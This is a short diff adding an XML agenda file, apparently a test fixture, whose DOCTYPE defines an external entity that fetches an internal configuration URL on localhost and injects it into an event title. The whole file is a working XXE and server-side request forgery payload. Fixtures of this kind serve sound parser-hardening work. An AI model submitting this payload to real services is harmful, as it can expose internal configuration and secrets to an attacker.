@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE agenda [
+  <!ENTITY xxe SYSTEM "http://127.0.0.1:4942/internal/config">
+]>
+<agenda>
+  <event>
+    <title>&xxe;</title>
+  </event>
+</agenda>
